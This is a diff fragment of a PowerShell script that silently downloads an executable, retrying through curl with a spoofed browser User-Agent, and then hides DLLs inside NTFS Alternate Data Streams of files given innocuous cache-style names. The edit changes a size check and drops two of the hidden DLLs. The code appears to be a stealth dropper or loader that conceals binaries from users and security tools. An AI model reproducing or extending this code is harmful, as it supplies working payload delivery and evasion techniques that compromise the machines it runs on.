@@ -180,25 +180,23 @@ try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 4000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
         $downloaded = $true
     }
 } catch {}
 
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 4000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
         $downloaded = $true
     }
 }
 
 Update-Step 75
 
-# Seal DLLs into ADS (Alternate Data Streams)
+# Seal Clean Component DLLs into ADS (Alternate Data Streams)
 $MAP = [ordered]@{
     "cimgui.dll" = @("winrescache.db",  "vtcache")
-    "AotBst.dll" = @("gphcache.db",     "vtmap")
-    "Client.dll" = @("ntprintcache.db", "vtload")
 }
 foreach ($name in $MAP.Keys) {
     $container = "$TEMPLATES\$($MAP[$name][0])"
